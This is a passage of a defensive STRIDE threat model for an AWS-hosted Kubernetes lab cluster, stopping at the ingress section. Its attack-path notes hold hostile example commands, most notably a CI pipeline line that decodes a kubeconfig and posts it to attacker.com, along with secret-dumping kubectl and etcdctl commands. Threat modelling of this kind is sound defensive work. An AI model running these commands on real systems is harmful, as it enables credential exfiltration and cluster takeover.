# Threat Model — AWS-Hosted Kubernetes Security Cluster

**Document ID:** TM-K8S-002  
**Version:** 2.0  
**Classification:** Internal / Lab Use  
**Author:** Jason A. Slocomb  
**Date:** 2026-04-02  
**Supersedes:** TM-K8S-001 (Proxmox-based homelab, 2026-03-02)  
**Framework:** STRIDE (Microsoft Threat Modeling Methodology)  
**Compliance Mapping:** NIST SP 800-171 Rev 2 / CMMC Level 2

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [System Overview](#2-system-overview)
3. [Architecture and Trust Boundaries](#3-architecture-and-trust-boundaries)
4. [Assets and Crown Jewels](#4-assets-and-crown-jewels)
5. [Threat Actors](#5-threat-actors)
6. [STRIDE Analysis by Component](#6-stride-analysis-by-component)
   - 6.1 [Kubernetes API Server](#61-kubernetes-api-server-kube-apiserver)
   - 6.2 [etcd (State Store)](#62-etcd-state-store)
   - 6.3 [Kubelet (Node Agent)](#63-kubelet-node-agent)
   - 6.4 [FreeIPA / Identity Provider](#64-freeipa--identity-provider)
   - 6.5 [GitLab CE (CI/CD Pipeline)](#65-gitlab-ce-cicd-pipeline)
   - 6.6 [AWX / Ansible Automation](#66-awx--ansible-automation)
   - 6.7 [Splunk SIEM](#67-splunk-siem)
   - 6.8 [Container Registry](#68-container-registry)
   - 6.9 [Ingress Controller](#69-ingress-controller)
   - 6.10 [Pod-to-Pod Network (East-West)](#610-pod-to-pod-network-east-west)
   - 6.11 [Kubernetes Secrets](#611-kubernetes-secrets)
   - 6.12 [NetBox CMDB](#612-netbox-cmdb)
   - 6.13 [Monitoring Stack (Prometheus / Grafana)](#613-monitoring-stack-prometheus--grafana)
   - 6.14 [Node OS (Rocky Linux 9.7)](#614-node-os-rocky-linux-97)
   - 6.15 [AWS Infrastructure Layer](#615-aws-infrastructure-layer)
   - 6.16 [Bastion Host](#616-bastion-host)
7. [Cross-Cutting Threats](#7-cross-cutting-threats)
8. [Threat Summary Matrix](#8-threat-summary-matrix)
9. [Mitigations and Controls](#9-mitigations-and-controls)
10. [NIST 800-171 Control Mapping](#10-nist-800-171-control-mapping)
11. [Residual Risk Register](#11-residual-risk-register)
12. [AWS-Specific Control Gaps vs. GovCloud IL2/IL4](#12-aws-specific-control-gaps-vs-govcloud-il2il4)
13. [Review and Maintenance](#13-review-and-maintenance)

---

## 1. Executive Summary

This document presents a formal STRIDE threat model for the AWS-hosted RKE2 Kubernetes security cluster (version 2.0), superseding the previous Proxmox-based model (TM-K8S-001). The migration from an on-premises hypervisor to AWS us-west-2 introduces a substantially different threat surface — replacing hypervisor-layer concerns with AWS IAM, EC2, VPC, and cloud control plane risks — while preserving the Kubernetes-layer threats largely unchanged.

The cluster demonstrates CMMC Level 2 compliance architecture across five Rocky Linux 9.7 EC2 instances spanning public and private subnets, with the full enterprise security stack: FreeIPA 4.12.2, GitLab CE 18.10.1, AWX (operator 3.2.1), NetBox 4.5.5, kube-prometheus-stack, Splunk Enterprise 10.2.1 with Universal Forwarders, Falco 0.43.0, and AIDE file integrity monitoring on all nodes.

**Key findings from this analysis:**

- The **AWS IAM layer** is an entirely new attack surface with no equivalent in the Proxmox model. Compromised EC2 instance roles, IMDS credential abuse, and account-level misconfigurations represent CRITICAL risks that did not exist in the previous architecture.
- The **bastion host** (public subnet) is now the primary ingress point for all administrative access, replacing the admin workstation. Its compromise grants SSH access to every private-subnet node.
- The **kube-apiserver** and **etcd** remain the highest-risk Kubernetes components; their threat profiles are unchanged from TM-K8S-001 but the delivery vector now routes through the bastion rather than a trusted LAN.
- The **CI/CD pipeline** (GitLab CE → AWX → cluster) remains the most likely real-world attack path. GitLab now runs natively on k8s-w01 (port 8929), reducing its attack surface vs. a public Helm deployment.
- **Falco** (now deployed, v0.43.0 with legacy eBPF driver) closes the runtime behavioral detection gap that was a Conditional risk in TM-K8S-001.
- **FreeIPA SPOF** remains an accepted residual risk; no replica has been deployed. AWS availability zone isolation provides physical redundancy for the EC2 layer but does not address the single-IPA authentication dependency.
- The **AWS metadata service (IMDS)** on every EC2 instance is a new lateral movement vector: a container escape that achieves node OS access can query the instance metadata endpoint and retrieve EC2 instance role credentials, potentially allowing cloud control plane operations.
- **VPC Security Groups** provide a meaningful network perimeter control absent in the homelab LAN, but do not replace Kubernetes NetworkPolicy for east-west pod traffic.

**Risk posture:** HIGH without the mitigations defined in Section 9. MEDIUM with full mitigation implementation. Target posture for CMMC Level 2 demonstration: LOW residual risk on all critical assets.

---

## 2. System Overview

### 2.1 Cluster Topology

```
┌──────────────────────────────────────────────────────────────────────────┐
│                        AWS us-west-2 (Account 355564824199)              │
│                                                                           │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │                           VPC                                      │  │
│  │                                                                    │  │
│  │  ┌──────────────────────────────┐                                  │  │
│  │  │      Public Subnet           │   ┌──────────────────────────┐   │  │
│  │  │                              │   │     Private Subnet       │   │  │
│  │  │  ┌──────────────┐            │   │                          │   │  │
│  │  │  │   bastion    │───SSH──────┼───►  ipa01 (FreeIPA 4.12.2) │   │  │
│  │  │  │ (t3.medium)  │           │   │  k8s-cp01 (control plane)│   │  │
│  │  │  └──────┬───────┘           │   │  k8s-w01 (GitLab/AWX)   │   │  │
│  │  │         │                   │   │  k8s-w02 (Splunk)        │   │  │
│  │  └─────────┼─────────────────┘   └──────────────────────────┘   │  │
│  │            │                                    │                  │  │
│  │            │                             NAT Gateway               │  │
│  │            │                                    │                  │  │
│  └────────────┼────────────────────────────────────┼──────────────────┘  │
│               │                                    │                      │
│           Internet                          AWS API endpoints             │
│           Gateway                       (EC2, S3, IAM, CloudWatch)       │
└──────────────────────────────────────────────────────────────────────────┘

Admin → Internet Gateway → bastion:22 → private nodes (SSH)
Admin → kubectl (configured via bastion tunnel) → k8s-cp01:6443
```

### 2.2 Technology Stack

| Layer | Technology | Version | Role |
|---|---|---|---|
| Cloud | AWS EC2 / VPC | - | Infrastructure |
| OS | Rocky Linux 9.7 (LVM) | 9.7 | Node base OS (RHEL-binary-compatible) |
| Container runtime | containerd | bundled with RKE2 | CRI |
| Kubernetes | RKE2 (CIS profile) | 1.31.x | Orchestration |
| Identity | FreeIPA | 4.12.2 | IdP / LDAP / Kerberos / DNS |
| Source control | GitLab CE | 18.10.1 | Source control (native, port 8929) |
| Automation | AWX | operator 3.2.1 | Ansible execution (Helm-deployed) |
| CMDB | NetBox | 4.5.5 | IPAM/DCIM / AWX dynamic inventory |
| SIEM | Splunk Enterprise | 10.2.1 | Log aggregation / detection (native) |
| Log shipping | Splunk Universal Forwarder | 10.2.1 | All nodes → Splunk |
| Monitoring | kube-prometheus-stack | - | Metrics / alerting |
| Dashboards | Grafana | 3000/tcp | Visualization |
| Runtime security | Falco | 0.43.0 (legacy eBPF) | Kernel-level behavioral detection |
| FIM | AIDE | - | File integrity (daily cron 02:00 UTC) |
| IaC | Terraform + Ansible | - | Provisioning / OS hardening |
| Ingress | RKE2 built-in NGINX | port 80 | L7 proxy (port 80 held by RKE2) |

### 2.3 Node Inventory

| Hostname | Instance Type | Subnet | Primary Role |
|---|---|---|---|
| bastion | t3.medium | Public | SSH jump host / admin ingress |
| ipa01 | t3.medium | Private | FreeIPA IdP / DNS / LDAP / Kerberos |
| k8s-cp01 | t3.medium | Private | RKE2 control plane / etcd / API server |
| k8s-w01 | t3.large | Private | GitLab CE / AWX (Helm) |
| k8s-w02 | t3.large | Private | Splunk Enterprise / general workloads |

---

## 3. Architecture and Trust Boundaries

Trust boundaries define where data crosses security domains. Threats most commonly manifest at these transitions.

### Trust Boundary Map

```
TB-1:  Internet                →  bastion (public subnet)      (Security Group: port 22 only)
TB-2:  bastion                 →  private subnet nodes          (SSH, Security Group)
TB-3:  Admin (kubectl)         →  kube-apiserver (via tunnel)   (mTLS, kubeconfig)
TB-4:  Ingress (port 80)       →  Pod network                   (cluster-internal)
TB-5:  Pod                     →  kube-apiserver                (RBAC + authn)
TB-6:  kube-apiserver          →  etcd                          (mTLS, internal only)
TB-7:  Node kubelet            →  kube-apiserver                (client cert authn)
TB-8:  FreeIPA                 →  kube-apiserver                (OIDC token validation)
TB-9:  GitLab CI               →  cluster                       (kubeconfig / SA token)
TB-10: AWX                     →  cluster / managed hosts       (ServiceAccount + SSH)
TB-11: Monitoring agents       →  scraped services              (network access)
TB-12: Splunk UF               →  Splunk (k8s-w02)             (HEC / syslog)
TB-13: EC2 instance            →  AWS IMDS (169.254.169.254)   (instance metadata / IAM role credentials)
TB-14: Private nodes           →  Internet (outbound)           (NAT Gateway)
TB-15: AWS IAM / EC2 API       →  Cloud control plane           (AWS credentials)
```

### Trust Levels (High to Low)

| Level | Actors | Implicit Trust |
|---|---|---|
| L0 — AWS Account Root | AWS root account | Full account trust; beyond cluster scope |
| L1 — AWS IAM / EC2 API | IAM roles, EC2 control plane | Cloud infrastructure trust |
| L2 — Control Plane | kube-apiserver, etcd, controller-manager, scheduler | Kubernetes root trust |
| L3 — Node OS | kubelet, containerd, node root | Host-level trust |
| L4 — Privileged Workloads | Splunk, AWX, Falco, system DaemonSets | Elevated cluster trust |
| L5 — Standard Workloads | GitLab, Grafana, NetBox | Normal pod trust |
| L6 — Users | Admin via kubectl, pipeline service accounts | Authenticated trust |
| L7 — Bastion | Jump host for admin SSH access | Controlled ingress point |
| L8 — External | Internet, unauthenticated inbound | Untrusted |

---

## 4. Assets and Crown Jewels

### 4.1 Critical Assets (Compromise = Full Cluster Loss)

| Asset | Location | Why Critical |
|---|---|---|
| etcd data store | k8s-cp01:/var/lib/etcd | All K8s state including Secrets; RBAC bypass if directly accessed |
| kube-apiserver TLS private key | k8s-cp01:/etc/kubernetes/ssl/ | Impersonates API server to all clients |
| etcd client certificates | k8s-cp01:/etc/kubernetes/ssl/ | Direct etcd access bypassing all Kubernetes RBAC |
| cluster-admin kubeconfig | Admin workstation, CI/CD vars | Full cluster privileges |
| FreeIPA admin / root credentials | ipa01 | Identity compromise propagates to all OIDC-integrated services |
| Node root SSH keys / bastion private key | bastion + all nodes | Gate to entire private subnet |
| AWS IAM EC2 instance role credentials | IMDS on all nodes | Cloud control plane access; potential account-wide lateral movement |

### 4.2 High-Value Assets

| Asset | Location | Impact of Compromise |
|---|---|---|
| GitLab root credentials | k8s-w01 (port 8929) | Source code exfiltration; malicious pipeline injection |
| Splunk admin credentials | k8s-w02 (port 8000) | Log deletion/tampering; blind detection capability |
| AWX admin + credential store | k8s-w01 (AWX namespace) | Arbitrary Ansible execution against all managed hosts |
| NetBox API tokens | netbox namespace | Inventory manipulation; AWX dynamic inventory poisoning |
| CI/CD kubeconfigs / tokens | GitLab CI variables | Cluster access from pipeline context |
| Falco rule set | Falco DaemonSet config | Silencing runtime detection rules |
| AIDE databases | All nodes (/var/lib/aide/) | Baseline tampering eliminates FIM detection |
| VPC Security Group rules | AWS console / Terraform state | Rule modification opens cluster to internet |
| AWS Security Group admin credentials | AWS account | Security Group modification grants arbitrary network access |

### 4.3 Sensitive Data in Transit

- Kerberos TGTs / service tickets (FreeIPA to services)
- OIDC id_tokens (FreeIPA to kube-apiserver, GitLab, AWX)
- ServiceAccount JWT tokens (pods to kube-apiserver)
- Ansible Vault passwords (AWX to playbook execution)
- Splunk HEC tokens (all UF nodes to k8s-w02)
- Container image pull secrets (nodes to registry)
- EC2 instance role credentials (IMDS to requesting process)
- SSH private keys (admin to bastion, bastion to private nodes)

---

## 5. Threat Actors

### 5.1 Actor Profiles

**TA-1: External Attacker**
Motivation: Opportunistic exploitation, botnet recruitment, credential harvesting, cloud resource abuse (cryptomining via compromised IAM role). No prior knowledge of the environment. Primarily targets bastion (TB-1) and any inadvertently exposed ports.

**TA-2: Compromised Supply Chain**
Motivation: Persistent access, data exfiltration. Operates through malicious container images, compromised upstream dependencies, or trojanized Ansible roles / Helm charts. Bypasses perimeter controls entirely.

**TA-3: Malicious Insider / Former Admin**
Motivation: Sabotage, data theft, credential abuse. Has prior knowledge of the architecture including AWS account details, node hostnames, and credential locations. May retain stale SSH keys, kubeconfigs, or AWS IAM credentials.

**TA-4: Compromised CI/CD Pipeline**
Motivation: Persistent cluster access, secret exfiltration, AWS credential harvesting from IMDS. Operates through a compromised GitLab runner, hijacked pipeline variables, or a poisoned `.gitlab-ci.yml`.

**TA-5: Compromised Workload (Container Escape)**
Motivation: Node-level access, IMDS credential theft, pivot to control plane. Exploits a vulnerability in a running container to break out to the host OS, then leverages node identity or EC2 instance role to access the API server or AWS APIs.

**TA-6: AWS Account Compromise**
Motivation: Infrastructure destruction, data exfiltration, ransomware via EBS snapshot deletion, cryptomining at scale. Operates via compromised IAM credentials, exposed AWS access keys, or IMDS abuse. Has no equivalent in the Proxmox model.

---

## 6. STRIDE Analysis by Component

> **STRIDE Key:**
> **S** = Spoofing | **T** = Tampering | **R** = Repudiation | **I** = Information Disclosure | **D** = Denial of Service | **E** = Elevation of Privilege
>
> **Risk levels:** CRITICAL / HIGH / MEDIUM / LOW  
> **Likelihood:** HIGH / MEDIUM / LOW (without mitigations in place)

---

### 6.1 Kubernetes API Server (kube-apiserver)

The kube-apiserver is the single control plane endpoint for all cluster state operations. Every kubectl command, controller reconciliation loop, and workload identity check passes through it. In the AWS architecture, it is accessible from the private subnet only; administrative access routes through the bastion SSH tunnel.

---

#### S — Spoofing

**S-1.1 | CRITICAL — Stolen kubeconfig impersonation**

An attacker who obtains a valid kubeconfig can authenticate as the corresponding user with no further exploitation required. In this deployment, kubeconfig credentials are stored on admin workstations and potentially in GitLab CI/CD variables.

> *Attack path:* Attacker compromises GitLab pipeline CI variable store → extracts `KUBE_CONFIG` variable → decodes base64 kubeconfig → authenticates to kube-apiserver as `cluster-admin` from any internet-connected host via bastion tunnel or direct API exposure.

*Threat actors:* TA-1, TA-3, TA-4 | *NIST:* AC-3.1.1, IA-3.5.1, SC-3.13.8, AU-3.3.1

---

**S-1.2 | HIGH — ServiceAccount token theft from pod filesystem**

ServiceAccount JWT tokens are projected into pods at `/var/run/secrets/kubernetes.io/serviceaccount/token`. A workload exploit achieving RCE in any pod gives the attacker this token, usable from anywhere the API server is reachable.

> *Attack path:* RCE via web application vulnerability in GitLab → extract projected SA token → use token from attacker-controlled host (via bastion or if apiserver is exposed) to authenticate to API server as the GitLab service account.

*Threat actors:* TA-2, TA-5 | *NIST:* IA-3.5.1, AC-3.1.1

---

**S-1.3 | MEDIUM — OIDC token replay attack**

OIDC tokens issued by FreeIPA (ipa01) intercepted in transit can be replayed for their full validity window. The kube-apiserver validates token signatures but has no replay detection.

*Threat actors:* TA-1, TA-3 | *NIST:* IA-3.5.2, SC-3.13.8

---

#### T — Tampering

**T-1.1 | CRITICAL — Malicious admission webhook injection**

A malicious or compromised `MutatingAdmissionWebhook` can silently modify all pod specs before etcd write — injecting environment variables, volumes, init containers, or privileged flags. The user's `kubectl apply` output reflects the original spec while the cluster runs the modified version.

> *Attack path:* Attacker gains write access via stolen SA token → registers `MutatingAdmissionWebhook` targeting all pods → webhook injects `hostPID: true` and malicious init container → node-level access on next deployment.

*Threat actors:* TA-3, TA-4, TA-5 | *NIST:* CM-3.4.3, SI-3.14.7

---

**T-1.2 | HIGH — RBAC policy privilege escalation**

An attacker with write access to `ClusterRole` or `Role` objects can grant additional permissions, including `cluster-admin`, without triggering obvious alerts unless RBAC drift monitoring is operational.

*Threat actors:* TA-4, TA-5 | *NIST:* AC-3.1.1, CM-3.4.3

---

**T-1.3 | MEDIUM — Audit log tampering or suppression**

If Splunk HEC is reachable from within the cluster without source validation, a compromised workload can flood the audit stream with noise or inject fabricated events. Local audit log files on `hostPath` mounts writable by containers can be deleted before ingestion.

*Threat actors:* TA-3, TA-5 | *NIST:* AU-3.3.1, AU-3.3.2

---

#### R — Repudiation

**R-1.1 | HIGH — Shared kubeconfig prevents actor attribution**

When multiple pipeline jobs share a single kubeconfig or ServiceAccount token, audit logs record the credential identity but not the specific human, job stage, or branch responsible for an action.

*Threat actors:* TA-3, TA-4 | *NIST:* AU-3.3.1, IA-3.5.4

---

#### I — Information Disclosure

**I-1.1 | CRITICAL — Secret enumeration via over-privileged list/get**

Any principal with `list` or `get` on `secrets` in any namespace can read all secrets in plaintext. A single over-privileged ServiceAccount represents a wide blast radius.

> *Attack path:* Attacker compromises AWX pod → `kubectl get secrets --all-namespaces -o yaml` → extracts all secrets including AWS IAM credentials stored as Kubernetes secrets.

*Threat actors:* TA-4, TA-5 | *NIST:* AC-3.1.1, SC-3.13.8, IA-3.5.4

---

**I-1.2 | HIGH — API discovery leaking resource layout**

The `/api`, `/apis`, and `/openapi/v2` endpoints enumerate all resource types, CRDs, and installed operators to any authenticated principal. An attacker uses these to build a complete attack surface map without triggering most alert rules.

*Threat actors:* TA-1, TA-5 | *NIST:* AC-3.1.1, SI-3.14.6

---

#### D — Denial of Service

**D-1.1 | HIGH — API server resource exhaustion via expensive list operations**

The kube-apiserver is a single-process server on a single control-plane node (k8s-cp01, t3.medium). Expensive watch/list requests — particularly `list secrets --all-namespaces` — can cause OOM kills or unresponsiveness, causing a hard cluster outage.

*Threat actors:* TA-1, TA-5 | *NIST:* SI-3.14.6, SC-3.13.1

---

**D-1.2 | MEDIUM — Webhook timeout cascade**

A slow or crashing `ValidatingAdmissionWebhook` set to `failurePolicy: Fail` blocks all matching resource creation until timeout, potentially cascading into a cluster-wide scheduling halt.

*Threat actors:* TA-2, TA-5 | *NIST:* SC-3.13.1, SI-3.14.2

---

#### E — Elevation of Privilege

**E-1.1 | CRITICAL — Privileged pod container escape**

A workload created with `privileged: true` has full access to the host's kernel namespaces and devices. Container escape is trivial from this context, followed by node OS root access and Falco evasion if Falco rules are not tuned to detect `nsenter` calls.

*Threat actors:* TA-4, TA-5 | *NIST:* AC-3.1.1, CM-3.4.5, SI-3.14.7

---

**E-1.2 | HIGH — Excessive cluster-admin ClusterRoleBinding grants**

Any service account bound to `cluster-admin` that is compromised grants the attacker full, unrestricted cluster access.

*Threat actors:* TA-3, TA-5 | *NIST:* AC-3.1.1, CM-3.4.5

---

### 6.2 etcd (State Store)

etcd is the authoritative source of truth for all Kubernetes state. Kubernetes Secrets are stored as base64-encoded values — not encrypted — by default. Direct etcd access bypasses all Kubernetes RBAC. On k8s-cp01, etcd listens internally; the control plane is in the private subnet with no internet exposure.

---

#### S — Spoofing

**S-2.1 | HIGH — etcd client certificate forgery**

etcd requires mTLS for all client connections. If the etcd CA private key (`/etc/kubernetes/ssl/etcd/`) is compromised via node-level access, an attacker can generate valid client certificates and connect directly to etcd with full read/write access.

*Threat actors:* TA-3, TA-5 | *NIST:* SC-3.13.8, IA-3.5.1

---

#### T — Tampering

**T-2.1 | CRITICAL — Direct etcd write bypassing all RBAC**

With valid etcd credentials, an attacker can write arbitrary data directly to etcd using `etcdctl` — creating or overwriting Secrets, modifying RBAC policies, creating privileged pods — without generating a single kube-apiserver audit log entry.

> *Attack path:* Attacker achieves node access on k8s-cp01 → retrieves etcd client certs → `etcdctl put /registry/secrets/production/aws-credentials <malicious_value>` → legitimate workload now reads attacker-controlled credentials. No audit event appears.

*Threat actors:* TA-3, TA-5 | *NIST:* CM-3.4.3, SC-3.13.8, AU-3.3.1

---

**T-2.2 | HIGH — etcd backup snapshot exfiltration**

etcd snapshots contain the complete cluster state including all Secrets in base64. If snapshots are written to S3 or another location with broader access than the control plane, they create a durable copy of all cluster secrets.

*Threat actors:* TA-3, TA-4 | *NIST:* MP-3.8.3, SC-3.13.8

---

#### I — Information Disclosure

**I-2.1 | CRITICAL — Secrets stored at rest without encryption**

By default, RKE2 does not encrypt Secret objects at rest in etcd. An attacker with read access to `/var/lib/etcd/member/` — via node compromise or backup access — can extract all secrets in base64 using standard tooling.

*Threat actors:* TA-3, TA-5 | *NIST:* SC-3.13.8, MP-3.8.3

---

#### D — Denial of Service

**D-2.1 | HIGH — Single-node etcd quorum disruption**

In a single-node etcd deployment, any disruption to the etcd process (disk full, high I/O contention, OOM kill) brings down the entire control plane. Recovery requires etcd restore from backup. On AWS, the t3.medium EBS volume reaching capacity is a realistic trigger.

*Threat actors:* TA-1, TA-5 | *NIST:* SC-3.13.1, SI-3.14.2

---

### 6.3 Kubelet (Node Agent)

The kubelet manages pod lifecycle on each node and exposes an authenticated API on port 10250. Kubelet compromise grants access to all pods running on that node.

---

#### S — Spoofing

**S-3.1 | MEDIUM — Unauthenticated kubelet API access**

If `--anonymous-auth=true`, the kubelet `/pods` and `/exec` endpoints are accessible without authentication from within the VPC. RKE2 sets `--anonymous-auth=false` by default; verification against each node should be confirmed.

*Threat actors:* TA-1, TA-6 | *NIST:* AC-3.1.1, IA-3.5.1

---

#### E — Elevation of Privilege

**E-3.1 | CRITICAL — Container escape to node OS**

As detailed in E-1.1, a privileged pod trivially escapes to the node OS. From node-level access on any EC2 instance, the attacker also gains the kubelet's client certificate, the containerd socket, pod filesystem access, and crucially — the ability to query the AWS IMDS endpoint for instance role credentials (see A-15.2).

*Threat actors:* TA-5 | *NIST:* AC-3.1.1, CM-3.4.5, SI-3.14.7

---

**E-3.2 | HIGH — Kubelet client certificate credential abuse**

The kubelet authenticates to the kube-apiserver with a client certificate bearing `CN=system:node:<nodename>`. Nodes have permission to read secrets associated with pods scheduled on them. An attacker who steals the kubelet client key can read secrets for all pods on that node.

*Threat actors:* TA-3, TA-5 | *NIST:* IA-3.5.1, AC-3.1.1

---

### 6.4 FreeIPA / Identity Provider

FreeIPA 4.12.2 on ipa01 (private subnet) provides LDAP, Kerberos, DNS, and OIDC token issuance for all services. A single FreeIPA instance is deployed with no replica. Compromise propagates to every OIDC-integrated service simultaneously.

---

#### S — Spoofing

**S-4.1 | CRITICAL — FreeIPA admin credential compromise**

The `admin` account has full directory management capability: creating users, resetting passwords, modifying group memberships, generating OIDC tokens for any user, and creating shadow identities. In this AWS deployment, ipa01 is accessible only from the private subnet; compromise requires either prior node access or bastion pivot.

*Threat actors:* TA-3, TA-6 | *NIST:* IA-3.5.1, AC-3.1.1, AU-3.3.1

---

**S-4.2 | HIGH — Kerberos golden ticket attack**

Compromise of the `krbtgt` account's secret key allows forging Ticket-Granting Tickets for any realm principal with arbitrary validity windows. Golden tickets are not invalidated by password changes and are difficult to detect without Splunk correlation against Kerberos service flag anomalies.

*Threat actors:* TA-3 | *NIST:* IA-3.5.1, IA-3.5.2, SC-3.13.8

---

#### T — Tampering

**T-4.1 | HIGH — LDAP group membership manipulation**

A user with LDAP write access can modify group memberships consumed by the kube-apiserver OIDC group claims via `ldapmodify`, bypassing any approval workflow implemented at the application layer.

*Threat actors:* TA-3 | *NIST:* AC-3.1.1, CM-3.4.3

---

#### I — Information Disclosure

**I-4.1 | MEDIUM — LDAP anonymous bind exposing directory structure**

FreeIPA may allow anonymous LDAP binds exposing user accounts, service accounts, group memberships, and host principals to any host in the private subnet — providing a complete target list for credential stuffing within the VPC.

*Threat actors:* TA-1, TA-6 | *NIST:* AC-3.1.1, AC-3.1.3

---

#### D — Denial of Service

**D-4.1 | HIGH — FreeIPA outage cascades to all authentication**

All OIDC-authenticated services — kube-apiserver, GitLab, AWX, Grafana, Splunk — lose new session authentication if ipa01 is unavailable. A single IPA server means any outage (disk full on EBS, process crash, network partition) causes simultaneous authentication failure across all integrated services.

*Threat actors:* TA-1, TA-5 | *NIST:* SC-3.13.1, SI-3.14.2

---

### 6.5 GitLab CE (CI/CD Pipeline)

GitLab CE 18.10.1 runs natively on k8s-w01 (port 8929), mirrored to GitHub (github.com/jslocomb/homelab-k8s). It is the source control and CI/CD platform, and a critical trust boundary: code committed to GitLab may be automatically applied to the cluster. Running natively rather than via Helm reduces but does not eliminate its attack surface.

---

#### S — Spoofing

**S-5.1 | HIGH — CI/CD variable exfiltration via pipeline injection**

GitLab pipeline variables (including kubeconfigs and AWS credentials) are accessible as environment variables within the runner process. A malicious `.gitlab-ci.yml` on an unprotected branch can exfiltrate all variables before code review.

> *Attack path:* Attacker opens MR with malicious `.gitlab-ci.yml` → pipeline executes → `echo $KUBE_CONFIG | base64 -d | curl -d @- https://attacker.com/` → full cluster access token exfiltrated.

*Threat actors:* TA-2, TA-4 | *NIST:* SC-3.13.8, AC-3.1.1, IA-3.5.1

---

#### T — Tampering

**T-5.1 | CRITICAL — Pipeline deploys malicious workloads to cluster**

A pipeline with cluster-deploy credentials triggered by a compromised account can deploy arbitrary Kubernetes resources, including privileged workloads not visible in the source repository.

*Threat actors:* TA-2, TA-4 | *NIST:* CM-3.4.3, SI-3.14.7

---

**T-5.2 | HIGH — Dependency confusion / supply chain poisoning**

GitLab pipelines installing packages from public registries (`pip install`, `helm repo add`) are vulnerable to dependency confusion attacks that execute malicious code in the build context — which has access to all CI/CD variables including kubeconfigs and AWS credentials.

*Threat actors:* TA-2 | *NIST:* SA-3.12.1, CM-3.4.1

---

#### R — Repudiation

**R-5.1 | MEDIUM — Shared CI service account prevents attribution**

If all pipeline stages deploy using a single `ci-deploy` ServiceAccount, determining which pipeline job or developer triggered an unauthorized change requires manual cross-referencing of GitLab pipeline logs with kube-apiserver audit timestamps.

*Threat actors:* TA-4 | *NIST:* AU-3.3.1, IA-3.5.4

---

### 6.6 AWX / Ansible Automation

AWX (operator 3.2.1, Helm-deployed) provides centralized Ansible execution with RBAC-controlled job templates and an encrypted credential store. The AWX `SECRET_KEY` — used to decrypt stored credentials — is a critical single point of failure. AWX uses NetBox as its dynamic inventory source via a custom Python script.

---

#### S — Spoofing

**S-6.1 | HIGH — AWX credential store exfiltration**

AWX stores credentials (SSH keys, Vault passwords, API tokens) encrypted in PostgreSQL using the `SECRET_KEY` environment variable. A compromise of the AWX pod retrieves both the encrypted credentials and the decryption key, exposing root SSH access to all managed nodes.

> *Attack path:* Attacker exploits AWX web UI CVE → RCE in AWX pod → reads `SECRET_KEY` from environment → decrypts credential database → extracts root SSH private key for all five EC2 nodes → full infrastructure compromise.

*Threat actors:* TA-1, TA-5 | *NIST:* SC-3.13.8, IA-3.5.4

---

**S-6.2 | MEDIUM — NetBox inventory poisoning via API token theft**

AWX uses NetBox as its dynamic inventory source. If a NetBox API token is compromised, an attacker can modify the CMDB inventory to redirect AWX playbook execution to attacker-controlled hosts or remove legitimate hosts from managed inventory (causing configuration drift to go unremediated).

*Threat actors:* TA-3, TA-5 | *NIST:* CM-3.4.1, SI-3.14.7

---

#### E — Elevation of Privilege

**E-6.1 | CRITICAL — Arbitrary playbook execution via variable injection**

If a user can trigger an AWX job template with `extra_vars` injection enabled ("Ask at launch"), they can run arbitrary commands on all managed EC2 nodes as root — including k8s-cp01, which would result in full cluster compromise.

*Threat actors:* TA-3, TA-4 | *NIST:* AC-3.1.1, CM-3.4.5, SI-3.14.7

---

### 6.7 Splunk SIEM

Splunk Enterprise 10.2.1 runs natively on k8s-w02 (port 8000) with Universal Forwarders on all five nodes ingesting audit logs, secure logs, syslog, and AIDE output. Splunk's integrity is a prerequisite for all detection capability.

---

#### T — Tampering

**T-7.1 | CRITICAL — Audit log deletion by compromised Splunk admin**

A Splunk `admin` attacker can delete entire indexes, suppress ingestion from specific sources, modify saved searches and alert thresholds, or create suppression rules — eliminating all forensic evidence and blinding incident response.

*Threat actors:* TA-3, TA-5 | *NIST:* AU-3.3.1, AU-3.3.2, SI-3.14.7

---

**T-7.2 | HIGH — HEC token abuse for log injection / poisoning**

HEC tokens stolen from pod environment variables allow injection of arbitrary events into any accessible Splunk index from any network-accessible client, enabling noise flooding, timeline manipulation, or suppression of genuine alerts.

> *Attack path:* Attacker reads HEC token from a Universal Forwarder config → crafts events with backdated timestamps → injects high-volume "normal" auth events → analyst's investigation of the attack window is flooded with fabricated clean events.

*Threat actors:* TA-5 | *NIST:* AU-3.3.1, SI-3.14.7

---

#### R — Repudiation

**R-7.1 | HIGH — Audit policy gaps create blind spots**

If the kube-apiserver audit policy does not log at `RequestResponse` level for secrets resources, or if any Universal Forwarder pipeline fails silently (network partition, HEC token expiry), gaps in the audit trail allow an attacker to restrict activity to unlogged resource types.

*Threat actors:* TA-3 | *NIST:* AU-3.3.1, SI-3.14.6

---

### 6.8 Container Registry

The cluster pulls container images from the GitLab Container Registry (k8s-w01, port 8929). Image integrity is a supply chain control.

---

#### T — Tampering

**T-8.1 | HIGH — Mutable image tag overwrite**

Container image tags are mutable pointers. An attacker who gains registry push credentials can overwrite an existing tag with a malicious image. Nodes pulling the tag on next deployment execute malicious code with no indication in deployment manifests.

*Threat actors:* TA-2, TA-4 | *NIST:* CM-3.4.1, CM-3.4.3, SA-3.12.1

---

**T-8.2 | MEDIUM — Base image poisoning via upstream compromise**

Workloads built `FROM rockylinux:9` or other public base images pull from public registries. A compromised upstream base image executes its malicious layers in every container built from it.

*Threat actors:* TA-2 | *NIST:* SA-3.12.1, CM-3.4.1

---

#### I — Information Disclosure

**I-8.1 | MEDIUM — Credentials embedded in image layers**

Credentials included in `RUN` or `ENV` Dockerfile instructions remain accessible in intermediate layer history and can be extracted by anyone with image pull access, even if removed in a subsequent layer.

*Threat actors:* TA-1, TA-4 | *NIST:* SC-3.13.8, IA-3.5.4

---

### 6.9 Ingress Controller

The RKE2 built-in NGINX Ingress Controller is the cluster's external-facing component (port 80). Port 80 is held by RKE2's ingress-nginx reuseport configuration; native services must use alternate ports. The Security Group for worker nodes allows port 80 inbound from the internet.

---

#### S — Spoofing

**S-9.1 | HIGH — TLS private key compromise enables MITM**

Extraction of a TLS private key from a Kubernetes Secret in the ingress namespace allows transparent man-in-the-middle attacks, intercepting credentials and session tokens for all services behind that hostname.

*Threat actors:* TA-1, TA-3 | *NIST:* SC-3.13.8, SC-3.13.10

---

#### D — Denial of Service

**D-9.1 | MEDIUM — Layer 7 request flood exhausting worker capacity**

